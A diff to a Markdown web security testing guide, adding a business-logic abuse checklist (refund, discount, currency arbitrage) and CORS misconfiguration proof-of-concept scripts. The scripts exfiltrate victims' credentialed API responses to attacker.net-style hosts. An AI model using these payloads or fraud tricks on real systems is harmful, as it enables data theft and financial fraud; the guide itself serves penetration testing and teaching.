@@ -134,6 +134,8 @@ To scan a Docker image for secrets, use the following command:
 ```bash
 docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest docker --image trufflesecurity/secrets
 ```
+## Account Takeover
+
 * [Password Reset Feature](#password-reset-feature)
     * [Password Reset Token Leak via Referrer](#password-reset-token-leak-via-referrer)
     * [Account Takeover Through Password Reset Poisoning](#account-takeover-through-password-reset-poisoning)
@@ -149,6 +151,83 @@ docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest docker --im
     * [Account Takeover via CSRF](#account-takeover-via-csrf)
     * Account Takeover via JWT - * JSON Web Token might be used to authenticate an user. Edit the JWT with another User ID / Email - Check for weak JWT signature
 
+## Business Logic Errors
+
+* [Methodology](#methodology)
+    * [Review Feature Testing](#review-feature-testing)
+    * [Discount Code Feature Testing](#discount-code-feature-testing)
+    * [Delivery Fee Manipulation](#delivery-fee-manipulation)
+    * [Currency Arbitrage](#currency-arbitrage)
+    * [Premium Feature Exploitation](#premium-feature-exploitation)
+    * [Refund Feature Exploitation](#refund-feature-exploitation)
+    * [Cart/Wishlist Exploitation](#cartwishlist-exploitation)
+    * [Thread Comment Testing](#thread-comment-testing)
+* [References](#references)
+
+## Methodology
+
+Unlike other types of security vulnerabilities like SQL injection or cross-site scripting (XSS), business logic errors do not rely on problems in the code itself (like unfiltered user input). Instead, they take advantage of the normal, intended functionality of the application, but use it in ways that the developer did not anticipate and that have undesired consequences.
+
+Common examples of Business Logic Errors.
+
+### Review Feature Testing
+
+* Assess if you can post a product review as a verified reviewer without having purchased the item.
+* Attempt to provide a rating outside of the standard scale, for instance, a 0, 6 or negative number in a 1 to 5 scale system.
+* Test if the same user can post multiple ratings for a single product. This is useful in detecting potential race conditions.
+* Determine if the file upload field permits all extensions; developers often overlook protections on these endpoints.
+* Investigate the possibility of posting reviews impersonating other users.
+* Attempt Cross-Site Request Forgery (CSRF) on this feature, as it's frequently unprotected by tokens.
+
+### Discount Code Feature Testing
+
+* Try to apply the same discount code multiple times to assess if it's reusable.
+* If the discount code is unique, evaluate for race conditions by applying the same code for two accounts simultaneously.
+* Test for Mass Assignment or HTTP Parameter Pollution to see if you can apply multiple discount codes when the application is designed to accept only one.
+* Test for vulnerabilities from missing input sanitization such as XSS, SQL Injection on this feature.
+* Attempt to apply discount codes to non-discounted items by manipulating the server-side request.
+
+### Delivery Fee Manipulation
+
+* Experiment with negative values for delivery charges to see if it reduces the final amount.
+* Evaluate if free delivery can be activated by modifying parameters.
+
+### Currency Arbitrage
+
+* Attempt to pay in one currency, for example, USD, and request a refund in another, like EUR. The difference in conversion rates could result in a profit.
+
+### Premium Feature Exploitation
+
+* Explore the possibility of accessing premium account-only sections or endpoints without a valid subscription.
+* Purchase a premium feature, cancel it, and see if you can still use it after a refund.
+* Look for true/false values in requests/responses that validate premium access. Use tools like Burp's Match & Replace to alter these values for unauthorized premium access.
+* Review cookies or local storage for variables validating premium access.
+
+### Refund Feature Exploitation
+
+* Purchase a product, ask for a refund, and see if the product remains accessible.
+* Look for opportunities for currency arbitrage.
+* Submit multiple cancellation requests for a subscription to check the possibility of multiple refunds.
+
+### Cart/Wishlist Exploitation
+
+* Test the system by adding products in negative quantities, along with other products, to balance the total.
+* Try to add more of a product than is available.
+* Check if a product in your wishlist or cart can be moved to another user's cart or removed from it.
+
+### Thread Comment Testing
+
+* Check if there's a limit to the number of comments on a thread.
+* If a user can only comment once, use race conditions to see if multiple comments can be posted.
+* If the system allows comments by verified or privileged users, try to mimic these parameters and see if you can comment as well.
+* Attempt to post comments impersonating other users.
+
+## References
+
+* [Business Logic Vulnerabilities - PortSwigger - 2024](https://portswigger.net/web-security/logic-flaws)
+* [Business Logic Vulnerability - OWASP - 2024](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)
+* [CWE-840: Business Logic Errors - CWE - March 24, 2011](https://cwe.mitre.org/data/definitions/840.html)
+* [Examples of Business Logic Vulnerabilities - PortSwigger - 2024](https://portswigger.net/web-security/logic-flaws/examples)
 # 3. Cross-Site Scripting (XSS)
 
 ## XSS Background
@@ -618,18 +697,214 @@ Subject: Email Forgery due to missing SPF
 ---
 # CORS (Cross-Origin Resource Sharing) Security Testing Guide
 
-## 1. Testing CORS Misconfigurations
+## 1. Testing CORS Misconfigurations (Origin Reflection)
 
 ### Steps to Check CORS Vulnerability:
-1. Add an `Origin` header.
-2. Set headers as:
-   ```
-   Origin: http://bing.com
-   Pragma: no-cache
-   Referer: https://bing.com/
-   ```
-3. Try `Origin: null`.
-4. Check for internal applications (same-site origin).
+1. Origin Reflection - Add an `Origin` header.
+
+```powershell
+GET /endpoint HTTP/1.1
+Host: victim.example.com
+Origin: https://evil.com
+Cookie: sessionid=... 
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://evil.com
+Access-Control-Allow-Credentials: true 
+
+{"[private API key]"}
+```
+#### Proof Of Concept
+
+This PoC requires that the respective JS script is hosted at `evil.com`
+
+```js
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://victim.example.com/endpoint',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//attacker.net/log?key='+this.responseText; 
+};
+```
+
+or
+
+```html
+<html>
+     <body>
+         <h2>CORS PoC</h2>
+         <div id="demo">
+             <button type="button" onclick="cors()">Exploit</button>
+         </div>
+         <script>
+             function cors() {
+             var xhr = new XMLHttpRequest();
+             xhr.onreadystatechange = function() {
+                 if (this.readyState == 4 && this.status == 200) {
+                 document.getElementById("demo").innerHTML = alert(this.responseText);
+                 }
+             };
+              xhr.open("GET",
+                       "https://victim.example.com/endpoint", true);
+             xhr.withCredentials = true;
+             xhr.send();
+             }
+         </script>
+     </body>
+ </html>
+```
+
+### Null Origin
+
+#### Vulnerable Implementation
+
+It's possible that the server does not reflect the complete `Origin` header but
+that the `null` origin is allowed. This would look like this in the server's
+response:
+
+```ps1
+GET /endpoint HTTP/1.1
+Host: victim.example.com
+Origin: null
+Cookie: sessionid=... 
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true 
+
+{"[private API key]"}
+```
+
+#### Proof Of Concept
+
+This can be exploited by putting the attack code into an iframe using the data
+URI scheme. If the data URI scheme is used, the browser will use the `null`
+origin in the request:
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open('get','https://victim.example.com/endpoint',true);
+  req.withCredentials = true;
+  req.send();
+
+  function reqListener() {
+    location='https://attacker.example.net/log?key='+encodeURIComponent(this.responseText);
+   };
+</script>"></iframe> 
+```
+### Wildcard Origin without Credentials
+
+If the server responds with a wildcard origin `*`, **the browser does never send
+the cookies**. However, if the server does not require authentication, it's still
+possible to access the data on the server. This can happen on internal servers
+that are not accessible from the Internet. The attacker's website can then
+pivot into the internal network and access the server's data without authentication.
+
+```powershell
+* is the only wildcard origin
+https://*.example.com is not valid
+```
+
+#### Vulnerable Implementation
+
+```powershell
+GET /endpoint HTTP/1.1
+Host: api.internal.example.com
+Origin: https://evil.com
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: *
+
+{"[private API key]"}
+```
+
+#### Proof Of Concept
+
+```js
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://api.internal.example.com/endpoint',true); 
+req.send();
+
+function reqListener() {
+    location='//attacker.net/log?key='+this.responseText; 
+};
+```
+### Expanding the Origin
+
+Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.
+
+#### Vulnerable Implementation (Example 1)
+
+In this scenario any prefix inserted in front of `example.com` will be accepted by the server.
+
+```ps1
+GET /endpoint HTTP/1.1
+Host: api.example.com
+Origin: https://evilexample.com
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://evilexample.com
+Access-Control-Allow-Credentials: true 
+
+{"[private API key]"}
+```
+
+#### Proof of Concept (Example 1)
+
+This PoC requires the respective JS script to be hosted at `evilexample.com`
+
+```js
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://api.example.com/endpoint',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//attacker.net/log?key='+this.responseText; 
+};
+```
+
+#### Vulnerable Implementation (Example 2)
+
+In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: `^api.example.com$` instead of `^api\.example.com$`. Thus, the dot can be replaced with any letter to gain access from a third-party domain.
+
+```ps1
+GET /endpoint HTTP/1.1
+Host: api.example.com
+Origin: https://apiiexample.com
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://apiiexample.com
+Access-Control-Allow-Credentials: true 
+
+{"[private API key]"}
+```
+
+#### Proof of concept (Example 2)
+
+This PoC requires the respective JS script to be hosted at `apiiexample.com`
+
+```js
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://api.example.com/endpoint',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    location='//attacker.net/log?key='+this.responseText; 
+};
+```
+
+
+5. Check for internal applications (same-site origin).
 
 ### Insecure Configurations Detection (Response Headers):
 ```bash
